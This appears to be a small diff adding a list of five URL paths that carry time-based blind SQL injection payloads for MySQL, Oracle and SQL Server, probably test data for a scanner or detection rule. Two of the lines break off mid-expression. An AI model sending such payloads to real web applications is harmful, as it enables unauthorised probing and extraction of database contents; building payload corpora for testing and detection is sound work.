@@ -1,0 +1,5 @@
+/index.php?id=1'And(Select*From(Select(
+/api/users?search=test'And(Select*From(Select(
+/view.php?type=1'+AND+7110=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101),2)--
+/api/v1/products?search=test";WAITFOR DELAY '0:0:2'--
+/api/items?cat=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(2)))x)
